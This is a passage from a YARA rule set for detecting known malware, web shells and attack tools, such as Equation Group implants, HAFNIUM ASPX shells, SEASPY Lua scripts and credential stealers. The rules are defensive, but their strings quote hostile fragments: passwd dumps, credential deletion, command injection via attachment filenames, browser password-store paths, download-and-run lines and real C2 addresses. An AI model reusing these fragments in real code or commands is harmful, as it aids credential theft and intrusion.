      $a2 = "Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.5195.54+Safari/537.36" ascii
      
      $s1 = " POST /moveitisapi/moveitisapi.dll" ascii
      $s2 = " POST /guestaccess.aspx"
      $s3 = " POST /api/v1/folders/"

      $s4 = "/files uploadType=resumable&"
      $s5 = " action=m2 "
   condition:
      1 of ($a*) and 3 of ($s*)
      or all of ($s*)
}

rule Equation_Kaspersky_TripleFantasy_1 {
	meta:
		description = "Equation Group Malware - TripleFantasy http://goo.gl/ivt8EW"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://goo.gl/ivt8EW"
		date = "2015/02/16"
		hash = "b2b2cd9ca6f5864ef2ac6382b7b6374a9fb2cbe9"
		id = "8d2adb3c-70e0-5768-bcfa-be64220064d9"
	strings:
		$s0 = "%SystemRoot%\\system32\\hnetcfg.dll" fullword wide
		$s1 = "%WINDIR%\\System32\\ahlhcib.dll" fullword wide
		$s2 = "%WINDIR%\\sjyntmv.dat" fullword wide
		$s3 = "Global\\{8c38e4f3-591f-91cf-06a6-67b84d8a0102}" fullword wide
		$s4 = "%WINDIR%\\System32\\owrwbsdi" fullword wide
		$s5 = "Chrome" fullword wide
		$s6 = "StringIndex" fullword ascii

		$x1 = "itemagic.net@443" fullword wide
		$x2 = "team4heat.net@443" fullword wide
		$x5 = "62.216.152.69@443" fullword wide
		$x6 = "84.233.205.37@443" fullword wide

		$z1 = "www.microsoft.com@80" fullword wide
		$z2 = "www.google.com@80" fullword wide
		$z3 = "127.0.0.1:3128" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 300000 and
		(
			( all of ($s*) and all of ($z*) ) or
			( all of ($s*) and 1 of ($x*) )
		)
}

rule Equation_Kaspersky_DoubleFantasy_1 {
	meta:
		description = "Equation Group Malware - DoubleFantasy"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://goo.gl/ivt8EW"
		date = "2015/02/16"
		hash = "d09b4b6d3244ac382049736ca98d7de0c6787fa2"
		id = "f3c87adf-86c3-5d7c-9532-75341841869a"
	strings:
		$z1 = "msvcp5%d.dll" fullword ascii

		$s0 = "actxprxy.GetProxyDllInfo" fullword ascii
		$s3 = "actxprxy.DllGetClassObject" fullword ascii
		$s5 = "actxprxy.DllRegisterServer" fullword ascii
		$s6 = "actxprxy.DllUnregisterServer" fullword ascii

		$x2 = "191H1a1" fullword ascii
		$x3 = "November " fullword ascii
		$x4 = "abababababab" fullword ascii
		$x5 = "January " fullword ascii
		$x6 = "October " fullword ascii
		$x7 = "September " fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 350000 and
		(
			( $z1 ) or
			( all of ($s*) and 6 of ($x*) )
		)
}

rule Equation_Kaspersky_GROK_Keylogger {
	meta:
		description = "Equation Group Malware - GROK keylogger"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://goo.gl/ivt8EW"
		date = "2015/02/16"
		hash = "50b8f125ed33233a545a1aac3c9d4bb6aa34b48f"
		id = "1bae3e86-54e5-55e9-8bbd-aa9ec2a0fa2b"
	strings:
		$s0 = "c:\\users\\rmgree5\\" ascii
		$s1 = "msrtdv.sys" fullword wide

		$x1 = "svrg.pdb" fullword ascii
		$x2 = "W32pServiceTable" fullword ascii
		$x3 = "In forma" fullword ascii
		$x4 = "ReleaseF" fullword ascii
		$x5 = "criptor" fullword ascii
		$x6 = "astMutex" fullword ascii
		$x7 = "ARASATAU" fullword ascii
		$x8 = "R0omp4ar" fullword ascii

		$z1 = "H.text" fullword ascii
		$z2 = "\\registry\\machine\\software\\Microsoft\\Windows NT\\CurrentVersion" wide
		$z4 = "\\registry\\machine\\SYSTEM\\ControlSet001\\Control\\Session Manager\\Environment" wide fullword
	condition:
		uint16(0) == 0x5a4d and filesize < 250000 and
		(
			$s0 or
			( $s1 and 6 of ($x*) ) or
			( 6 of ($x*) and all of ($z*) )
		)
}

rule Equation_Kaspersky_EquationDrugInstaller {
	meta:
		description = "Equation Group Malware - EquationDrug installer LUTEUSOBSTOS"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://goo.gl/ivt8EW"
		date = "2015/02/16"
		hash = "61fab1b8451275c7fd580895d9c68e152ff46417"
		id = "fa549e6e-f0d8-55ea-9ec9-c8ec53b55dec"
	strings:
		$s0 = "\\system32\\win32k.sys" wide
		$s1 = "ALL_FIREWALLS" fullword ascii

		$x1 = "@prkMtx" fullword wide
		$x2 = "STATIC" fullword wide
		$x3 = "windir" fullword wide
		$x4 = "cnFormVoidFBC" fullword wide
		$x5 = "CcnFormSyncExFBC" fullword wide
		$x6 = "WinStaObj" fullword wide
		$x7 = "BINRES" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 500000 and all of ($s*) and 5 of ($x*)
}

rule Equation_Kaspersky_EquationLaserInstaller {
   meta:
      description = "Equation Group Malware - EquationLaser Installer"
      author = "Florian Roth (Nextron Systems)"
      reference = "http://goo.gl/ivt8EW"
      date = "2015/02/16"
      hash = "5e1f56c1e57fbff96d4999db1fd6dd0f7d8221df"
      score = 80
      id = "15fd5668-36f2-556c-8150-225d3cbd4121"
   strings:
      $s0 = "Failed to get Windows version" fullword ascii
      $s1 = "lsasrv32.dll and lsass.exe" fullword wide
      $s2 = "\\\\%s\\mailslot\\%s" fullword ascii
      $s3 = "%d-%d-%d %d:%d:%d Z" fullword ascii
      $s4 = "lsasrv32.dll" fullword ascii
      /* $s5 = "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!" fullword ascii */ /* Modified by Florian Roth */
      $s6 = "%s %02x %s" fullword ascii
      $s7 = "VIEWERS" fullword ascii
      $s8 = "5.2.3790.220 (srv03_gdr.040918-1552)" fullword wide
   condition:
      ( uint16(0) == 0x5a4d ) and filesize < 250000 and 6 of ($s*)
}

rule Equation_Kaspersky_HDD_reprogramming_module {
	meta:
		description = "Equation Group Malware - HDD reprogramming module"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://goo.gl/ivt8EW"
		date = "2015/02/16"
		hash = "ff2b50f371eb26f22eb8a2118e9ab0e015081500"
		id = "09ffe270-39e7-5225-b4a9-1c8d312a09c1"
	strings:
		$s0 = "nls_933w.dll" fullword ascii

		$s1 = "BINARY" fullword wide
		$s2 = "KfAcquireSpinLock" fullword ascii
		$s3 = "HAL.dll" fullword ascii
		$s4 = "READ_REGISTER_UCHAR" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 300000 and all of ($s*)
}

rule Equation_Kaspersky_EOP_Package {
	meta:
		description = "Equation Group Malware - EoP package and malware launcher"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "http://goo.gl/ivt8EW"
		date = "2015/02/16"
		hash = "2bd1b1f5b4384ce802d5d32d8c8fd3d1dc04b962"
		id = "2eb97873-a415-57be-a8fb-70ef86a99c9b"
	strings:
		$s0 = "abababababab" fullword ascii
		$s1 = "abcdefghijklmnopq" fullword ascii
		$s2 = "@STATIC" fullword wide
		$s3 = "$aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" fullword ascii
		$s4 = "@prkMtx" fullword wide
		$s5 = "prkMtx" fullword wide
		$s6 = "cnFormVoidFBC" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 100000 and all of ($s*)
}

rule CN_Honker_Injection_Transit_jmCook {
    meta:
        description = "Script from disclosed CN Honker Pentest Toolset - file jmCook.asp"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "Disclosed CN Honker Pentest Toolset"
        date = "2015-06-23"
		score = 70
        hash = "5e1851c77ce922e682333a3cb83b8506e1d7395d"
        id = "468abb0e-a163-5fc5-b6a1-896fc04b8570"
    strings:
        $s1 = ".Open \"POST\",PostUrl,False" fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "JmdcwName=request(\"jmdcw\")" fullword ascii /* PEStudio Blacklist: strings */
    condition:
        filesize < 9KB and all of them
}

rule CN_Honker_Alien_D {
    meta:
        description = "Script from disclosed CN Honker Pentest Toolset - file D.ASP"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "Disclosed CN Honker Pentest Toolset"
        date = "2015-06-23"
		score = 70
        hash = "de9cd4bd72b1384b182d58621f51815a77a5f07d"
        id = "88529577-0dea-5aa8-b763-79a69397ddd5"
    strings:
        $s0 = "Paths_str=\"c:\\windows\\\"&chr(13)&chr(10)&\"c:\\Documents and Settings\\\"&chr" ascii /* PEStudio Blacklist: strings */
        $s1 = "CONST_FSO=\"Script\"&\"ing.Fil\"&\"eSyst\"&\"emObject\"" fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "Response.Write \"<form id='form1' name='form1' method='post' action=''>\"" fullword ascii /* PEStudio Blacklist: strings */
        $s3 = "set getAtt=FSO.GetFile(filepath)" fullword ascii
        $s4 = "Response.Write \"<input name='NoCheckTemp' type='checkbox' id='NoCheckTemp' chec" ascii
    condition:
        filesize < 30KB and 2 of them
}

rule CN_Honker_ChinaChopper_db {
    meta:
        description = "Script from disclosed CN Honker Pentest Toolset - file db.mdb"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "Disclosed CN Honker Pentest Toolset"
        date = "2015-06-23"
		score = 70
        hash = "af79ff2689a6b7a90a5d3c0ebe709e42f2a15597"
        id = "1314e204-d3f5-5f0a-bb74-dc774fef3d3c"
    strings:
        $s1 = "http://www.maicaidao.com/server.phpcaidao" fullword wide /* PEStudio Blacklist: strings */
        $s2 = "<O>act=login</O>" fullword wide /* PEStudio Blacklist: strings */
        $s3 = "<H>localhost</H>" fullword wide /* PEStudio Blacklist: strings */
    condition:
        filesize < 340KB and 2 of them
}

rule CN_Honker_Intersect2_Beta {
    meta:
        description = "Script from disclosed CN Honker Pentest Toolset - file Intersect2-Beta.py"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "Disclosed CN Honker Pentest Toolset"
        date = "2015-06-23"
		score = 70
        hash = "3ba5f720c4994cd4ad519b457e232365e66f37cc"
        id = "d20da18d-f8c9-5eb3-8d5d-c8816cff3200"
    strings:
        $s1 = "os.system(\"ls -alhR /home > AllUsers.txt\")" fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "os.system('getent passwd > passwd.txt')" fullword ascii /* PEStudio Blacklist: strings */
        $s3 = "os.system(\"rm -rf credentials/\")" fullword ascii /* PEStudio Blacklist: strings */
    condition:
        uint16(0) == 0x2123 and filesize < 50KB and 2 of them
}

rule CN_Honker_nc_MOVE {
    meta:
        description = "Script from disclosed CN Honker Pentest Toolset - file MOVE.txt"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
        reference = "Disclosed CN Honker Pentest Toolset"
        date = "2015-06-23"
		score = 70
        hash = "4195370c103ca467cddc8f2724a8e477635be424"
        id = "115d1ec9-6c4f-587e-977c-cd24ada89ab6"
    strings:
        $s0 = "Destination: http://202.113.20.235/gj/images/2.asp" fullword ascii /* PEStudio Blacklist: strings */
        $s1 = "HOST: 202.113.20.235" fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "MOVE /gj/images/A.txt HTTP/1.1" fullword ascii
    condition:
        filesize < 1KB and all of them
}

rule REGEORG_Tuneller_generic {
    meta:
        author = "Mandiant"
        date = "2021-12-20"
        date_modified = "2021-12-20"
        hash = "ba22992ce835dadcd06bff4ab7b162f9"
        reference = "https://www.mandiant.com/resources/unc3524-eye-spy-email"
        id = "a87979b7-2732-5a32-b3f3-a815a58b6589"
    strings:
        $s1 = "System.Net.IPEndPoint"
        $s2 = "Response.AddHeader"
        $s3 = "Request.InputStream.Read"
        $s4 = "Request.Headers.Get"
        $s5 = "Response.Write"
        $s6 = "System.Buffer.BlockCopy"
        $s7 = "Response.BinaryWrite"
        $s8 = "SocketException soex"
    condition:
        filesize < 1MB and 7 of them
}

rule VUL_JQuery_FileUpload_CVE_2018_9206 {
   meta:
      description = "Detects JQuery File Upload vulnerability CVE-2018-9206"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://www.zdnet.com/article/zero-day-in-popular-jquery-plugin-actively-exploited-for-at-least-three-years/"
      reference2 = "https://github.com/blueimp/jQuery-File-Upload/commit/aeb47e51c67df8a504b7726595576c1c66b5dc2f"
      reference3 = "https://blogs.akamai.com/sitr/2018/10/having-the-security-rug-pulled-out-from-under-you.html"
      date = "2018-10-19"
      id = "20bac44c-0e5a-5561-9fd8-a71cd2d8590a"
   strings:
      $s1 = "error_reporting(E_ALL | E_STRICT);" fullword ascii
      $s2 = "require('UploadHandler.php');" fullword ascii
      $s3 = "$upload_handler = new UploadHandler();" fullword ascii
   condition:
      all of them
}

rule APT_MAL_UNC4841_SEASPY_LUA_Jun23_1 {
   meta:
      description = "Detects SEASPY malware related LUA script"
      author = "Florian Roth"
      reference = "https://blog.talosintelligence.com/alchimist-offensive-framework/"
      date = "2023-06-16"
      score = 90
      hash1 = "56e8066bf83ff6fe0cec92aede90f6722260e0a3f169fc163ed88589bffd7451"
      id = "a44861d0-107e-589b-8cf1-3fbc2f5c78dc"
   strings:
      $x1 = "os.execute('rverify'..' /tmp/'..attachment:filename())" ascii fullword
      $x2 = "log.debug(\"--- opening archive [%s], mimetype [%s]\", tmpfile" ascii fullword

      $xe1 = "os.execute('rverify'..' /tmp/'..attachment:filename())" ascii base64
      $xe2 = "log.debug(\"--- opening archive [%s], mimetype [%s]\", tmpfile" ascii base64
   condition:
      filesize < 500KB and 1 of them
}

rule APT_MAL_LUA_Hunting_Lua_SEASPRAY_1 {
    meta:
        author = "Mandiant"
        date = "2023-06-15"
        reference = "https://www.mandiant.com/resources/blog/barracuda-esg-exploited-globally"
        description = "Hunting rule looking for strings observed in SEASPRAY samples."
        hash = "35cf6faf442d325961935f660e2ab5a0"
        score = 70
        id = "8c744b85-b61e-56d0-8a9e-ae6a954e1b95"
    strings:
        $str1 = "string.find(attachment:filename(),'obt075') ~= nil" 
        $str2 = "os.execute('cp '..tostring(tmpfile)..' /tmp/'..attachment:filename())" 
        $str3 = "os.execute('rverify'..' /tmp/'..attachment:filename())" 
    condition:
        all of them
}

rule Microcin_Sample_2 {
   meta:
      description = "Malware sample mentioned in Microcin technical report by Kaspersky"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf"
      date = "2017-09-26"
      hash1 = "8a7d04229722539f2480270851184d75b26c375a77b468d8cbad6dbdb0c99271"
      id = "8718ef84-be2b-55a6-a4bb-41161548a2b4"
   strings:
      $s2 = "[Pause]" fullword ascii
      $s7 = "IconCache_%02d%02d%02d%02d%02d" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and all of them )
}

rule Microcin_Sample_3 {
   meta:
      description = "Malware sample mentioned in Microcin technical report by Kaspersky"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf"
      date = "2017-09-26"
      hash1 = "4f74a3b67c5ed6f38f08786f1601214412249fe128f12c51525135710d681e1d"
      id = "daecdfe3-e78c-55ee-83a3-3cee8cb9bb5f"
   strings:
      $x1 = "C:\\Users\\Lenovo\\Desktop\\test\\Release\\test.pdb" fullword ascii
      $s2 = "test, Version 1.0" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and all of them )
}

rule Microcin_Sample_5 {
   meta:
      description = "Malware sample mentioned in Microcin technical report by Kaspersky"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf"
      date = "2017-09-26"
      hash1 = "b9c51397e79d5a5fd37647bc4e4ee63018ac3ab9d050b02190403eb717b1366e"
      id = "cd06f9f7-0ba3-52c9-a814-be1cd53e2e42"
   strings:
      $x1 = "Sorry, you are not fortuante ^_^, Please try other password dictionary " fullword ascii
      $x2 = "DomCrack <IP> <UserName> <Password_Dic file path> <option>" fullword ascii
      $x3 = "The password is \"%s\"         Time: %d(s)" fullword ascii
      $x4 = "The password is \" %s \"         Time: %d(s)" fullword ascii
      $x5 = "No password found!" fullword ascii
      $x7 = "Can not found the Password Dictoonary file! " fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and 1 of them ) or 2 of them
}

rule Microcin_Sample_6 {
   meta:
      description = "Malware sample mentioned in Microcin technical report by Kaspersky"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf"
      date = "2017-09-26"
      hash1 = "cbd43e70dc55e94140099722d7b91b07a3997722d4a539ecc4015f37ea14a26e"
      hash2 = "871ab24fd6ae15783dd9df5010d794b6121c4316b11f30a55f23ba37eef4b87a"
      id = "9988723f-a7ca-598f-9a6c-9f3915732117"
   strings:
      $s1 = "** ERROR ** %s: %s" fullword ascii
      $s2 = "TEMPDATA" fullword wide
      $s3 = "Bruntime error " fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 600KB and all of them )
}

rule Codoso_PGV_PVID_1 {
   meta:
      description = "Detects Codoso APT PGV PVID Malware"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
      date = "2016-01-30"
      super_rule = 1
      hash1 = "41a936b0d1fd90dffb2f6d0bcaf4ad0536f93ca7591f7b75b0cd1af8804d0824"
      hash2 = "58334eb7fed37e3104d8235d918aa5b7856f33ea52a74cf90a5ef5542a404ac3"
      hash3 = "934b87ddceabb2063b5e5bc4f964628fe0c63b63bb2346b105ece19915384fc7"
      hash4 = "ce91ea20aa2e6af79508dd0a40ab0981f463b4d2714de55e66d228c579578266"
      hash5 = "e770a298ae819bba1c70d0c9a2e02e4680d3cdba22d558d21caaa74e3970adf1"
      id = "9487773a-01d9-558e-8866-b8a8650996ba"
   strings:
      $x1 = "DRIVERS\\ipinip.sys" fullword wide

      $s1 = "TsWorkSpaces.dll" fullword ascii
      $s2 = "%SystemRoot%\\System32\\wiaservc.dll" fullword wide
      $s3 = "/selfservice/microsites/search.php?%016I64d" fullword ascii
      $s4 = "/solutions/company-size/smb/index.htm?%016I64d" fullword ascii
      $s5 = "Microsoft Chart ActiveX Control" fullword wide
      $s6 = "MSChartCtrl.ocx" fullword wide
      $s7 = "{%08X-%04X-%04x-%02X%02X-%02X%02X%02X%02X%02X%02X}" fullword ascii
      $s8 = "WUServiceMain" fullword ascii /* Goodware String - occured 2 times */
      $s9 = "Cookie: pgv_pvid=" ascii
   condition:
      ( uint16(0) == 0x5a4d and ( 1 of ($x*) or 3 of them ) ) or
      5 of them
}

rule MAL_Envrial_Jan18_1 {
   meta:
      description = "Detects Encrial credential stealer malware"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://twitter.com/malwrhunterteam/status/953313514629853184"
      date = "2018-01-21"
      hash1 = "9ae3aa2c61f7895ba6b1a3f85fbe36c8697287dc7477c5a03d32cf994fdbce85"
      hash2 = "9edd8f0e22340ecc45c5f09e449aa85d196f3f506ff3f44275367df924b95c5d"
      id = "8be5f0d8-013f-5070-9e19-9ac522c88693"
   strings:
      $x1 = "/Evrial/master/domen" wide

      $a1 = "\\Opera Software\\Opera Stable\\Login Data" wide
      $a2 = "\\Comodo\\Dragon\\User Data\\Default\\Login Data" wide
      $a3 = "\\Google\\Chrome\\User Data\\Default\\Login Data" wide
      $a4 = "\\Orbitum\\User Data\\Default\\Login Data" wide
      $a5 = "\\Kometa\\User Data\\Default\\Login Data" wide

      $s1 = "dlhosta.exe" fullword wide
      $s2 = "\\passwords.log" wide
      $s3 = "{{ <>h__TransparentIdentifier1 = {0}, Password = {1} }}" fullword wide
      $s4 = "files/upload.php?user={0}&hwid={1}" fullword wide
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and (
        1 of ($x*) or
        3 of them or
        2 of ($s*)
      )
}

rule IronTiger_ASPXSpy : HIGHVOL
{
	meta:
		author = "Cyber Safety Solutions, Trend Micro"
		description = "ASPXSpy detection. It might be used by other fraudsters"
		reference = "http://goo.gl/T5fSJC"
		id = "3010fcb9-0dbf-59ef-90ce-01d922a95f2d"
	strings:
		$str2 = "IIS Spy" wide ascii
		$str3 = "protected void DGCoW(object sender,EventArgs e)" wide ascii
	condition:
		any of ($str*)
}

rule APT_MAL_ASPX_HAFNIUM_Chopper_Mar21_3 {
   meta:
      description = "Detects HAFNIUM ASPX files dropped on compromised servers"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/"
      date = "2021-03-07"
      score = 85
      id = "9c2ba123-63c4-5e9c-a08f-bd9db3304691"
   strings:
      $s1 = "runat=\"server\">void Page_Load(object" ascii wide 
      $s2 = "Request.Files[0].SaveAs(Server.MapPath(" ascii wide
   condition:
      filesize < 50KB and
      all of them
}

rule APT_MAL_ASP_DLL_HAFNIUM_Mar21_1 {
   meta:
      description = "Detects HAFNIUM compiled ASP.NET DLLs dropped on compromised servers"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/"
      date = "2021-03-05"
      score = 65
      hash1 = "097f5f700c000a13b91855beb61a931d34fb0abb738a110368f525e25c5bc738"
      hash2 = "15744e767cbaa9b37ff7bb5c036dda9b653fc54fc9a96fe73fbd639150b3daa3"
      hash3 = "52ae4de2e3f0ef7fe27c699cb60d41129a3acd4a62be60accc85d88c296e1ddb"
      hash4 = "5f0480035ee23a12302c88be10e54bf3adbcf271a4bb1106d4975a28234d3af8"
      hash5 = "6243fd2826c528ee329599153355fd00153dee611ca33ec17effcf00205a6e4e"
      hash6 = "ebf6799bb86f0da2b05e66a0fe5a9b42df6dac848f4b951b2ed7b7a4866f19ef"
      id = "68b8252e-a07d-5507-b556-a4d473f98157"
   strings:
      $s1 = "Page_Load" ascii fullword
      
      $sc1 = { 20 00 3A 00 20 00 68 00 74 00 74 00 70 00 3A 00
               2F 00 2F 00 (66|67) 00 2F 00 00 89 A3 0D 00 0A 00 }

      $op1 = { 00 43 00 58 00 77 00 30 00 4a 00 45 00 00 51 7e 00 2f }
      $op2 = { 58 00 77 00 30 00 4a 00 45 00 00 51 7e 00 2f 00 61 00 }
      $op3 = { 01 0e 0e 05 20 01 01 11 79 04 07 01 12 2d 04 07 01 12 31 02 }
      $op4 = { 5e 00 03 00 bc 22 00 00 00 00 01 00 85 03 2b 00 03 00 cc }
   condition:
      uint16(0) == 0x5a4d and
      filesize < 50KB and
      all of ($s*) or all of ($op*)
}

rule SUSP_LNX_ByteEncoder_Jan25 {
   meta:
      description = "Detects Linux binaries that encode bytes by splitting them into upper and lower nibbles and mapping them to custom lookup tables, seen being used by SEASPY and Bluez backdoors"
      author = "MalGamy (Nextron System)"
      date = "2025-01-23"
      reference = "https://www.securityweek.com/newly-discovered-turla-malware-targets-linux-systems/"
      hash = "3e0312ce8d0c1e5c192dbb93cac4770a1205c56dc9d02a0510c7e10a15251de5"
      hash = "301d58a6a1819466e77209dbf8ca635cbee3b45516e5ee228fea50ae4a27b7d5"
      hash = "957c0c135b50d1c209840ec7ead60912a5ccefd2873bf5722cb85354cea4eb37"
      hash = "5e3c128749f7ae4616a4620e0b53c0e5381724a790bba8314acb502ce7334df2"
      hash = "b0b83e1c69aa8df6da4383230bef1ef46e09f3bf26cec877eac53a9d48dc53ca"
      hash = "d21b40645e33638bd36b63582c2c6ad5e8230c731236a54e8e5f4139bad31fdf"
      score = 75
      id = "4866348a-2129-5f6a-9498-8ab1acfa74b4"
   strings:
      $op1 = {8B 45 FC 48 63 D0 48 8B 45 A8 48 01 C2 8B 45 BC C1 F8 04 83 E0 0F 48 98 0F B6 44 05 E0 88 02} // Encode upper nibbl
      $op2 = {8B 45 FC 48 98 48 8D 50 01 48 8B 45 A8 48 01 C2 8B 45 BC 83 E0 0F 48 98 0F B6 44 05 C0 88 02} // Encode lower nibble
   condition:
      uint32be(0) == 0x7f454c46
      and filesize < 4MB
      and all of them
}

rule SUSP_LNX_StackString_Technique_Jan25 {
   meta:
      description = "Detects suspicious Linux binaries using stack-based string manipulation techniques, which are often used to generate PTY (pseudo-terminal) device names for stealth or persistence, seen being used by SEASPY and Bluez backdoors"
      author = "MalGamy (Nextron System)"
      date = "2025-01-23"
      reference = "https://www.securityweek.com/newly-discovered-turla-malware-targets-linux-systems/"
      hash = "0e65a80c6331a0e8d7df05ac217a8a7fe03b88f1d304f2ff0a26b92ed89153f3"
      hash = "3e0312ce8d0c1e5c192dbb93cac4770a1205c56dc9d02a0510c7e10a15251de5"
      hash = "301d58a6a1819466e77209dbf8ca635cbee3b45516e5ee228fea50ae4a27b7d5"
      hash = "957c0c135b50d1c209840ec7ead60912a5ccefd2873bf5722cb85354cea4eb37"
      hash = "5e3c128749f7ae4616a4620e0b53c0e5381724a790bba8314acb502ce7334df2"
      hash = "654b7c5b667e4d70ebb5fb1807dcd1ee5b453f45424eb59a287d86ad8d0598a1"
      hash = "ac6a8ec0b92935b7faab05ca21a42ed9eecdc9243fcf1449cc8f050de38e4c4f"
      score = 75
      id = "6c81d8c1-0cfa-54d9-89d3-2b025cc22f13"
   strings:
      $op1 = {C7 45 E0 70 71 72 73 C7 45 E4 74 75 76 77 C7 45 E8 78 79 7A 61 C7 45 EC 62 63 64 65 C6 45 F0 00 C7 45 C0 30 31 32 33 C7 45 C4 34 35 36 37 C7 45 C8 38 39 61 62 C7 45 CC 63 64 65 66} // tack-based string manipulation technique
   condition:
      uint32be(0) == 0x7f454c46
      and filesize < 4MB
      and $op1
}

rule MAL_PHP_EFile_Apr23_1 {
   meta:
      description = "Detects malware "
      author = "Florian Roth"
      reference = "https://twitter.com/malwrhunterteam/status/1642988428080865281?s=12&t=C0_T_re0wRP_NfKa27Xw9w"
      date = "2023-04-06"
      score = 75
      id = "d663b38e-b082-5cf7-9853-f4685bf3a87b"
   strings:
      $s1 = "mt_rand( 0, 0xffff ), mt_rand( 0, 0xffff )" ascii
      $s2 = "C:\\\\ProgramData\\\\Browsers" ascii fullword
      $s3 = "curl_https($api_url." ascii
   condition:
      all of them
}

rule CrunchRAT {
   meta:
      description = "Detects CrunchRAT - file CrunchRAT.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://github.com/t3ntman/CrunchRAT"
      date = "2017-11-03"
      hash1 = "58a07e96497745b6fd5075d569f17b0254c3e50b0234744e0487f7c5dddf7161"
      id = "da7d9b5c-6ccc-5960-9daa-4df612545751"
   strings:
      $x1 = "----CrunchRAT" fullword wide
      $x2 = "\\Debug\\CrunchRAT" ascii
      $x3 = "\\Release\\CrunchRAT" ascii

      $s1 = "runCommand" fullword ascii
      $s2 = "<action>download<action>" fullword wide
      $s3 = "Content-Disposition: form-data; name=action" fullword wide
      $s4 = "<action>upload<action>" fullword wide
      $s5 = "/update.php" fullword wide
   condition:
      uint16(0) == 0x5a4d and filesize < 40KB and ( 1 of ($x*) and 3 of them )
}

rule APT_Malware_CommentCrew_MiniASP {
	meta:
		description = "CommentCrew Malware MiniASP APT"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "VT Analysis"
		date = "2015-06-03"
		super_rule = 1
		hash0 = "0af4360a5ae54d789a8814bf7791d5c77136d625"
		hash1 = "777bf8def279942a25750feffc11d8a36cc0acf9"
		hash2 = "173f20b126cb57fc8ab04d01ae223071e2345f97"
		id = "a434012d-d13a-5061-a1d8-180d2c5828e8"
	strings:
		$x1 = "\\MiniAsp4\\Release\\MiniAsp.pdb" ascii /* score: '19.02' */
		$x2 = "run http://%s/logo.png setup.exe" fullword ascii /* PEStudio Blacklist: strings */ /* score: '37.02' */
		$x3 = "d:\\command.txt" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.01' */

		$z1 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR " ascii /* PEStudio Blacklist: strings */ /* score: '24.02' */
		$z2 = "Mozilla/4.0 (compatible; MSIE 7.4; Win32;32-bit)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '22.03' */
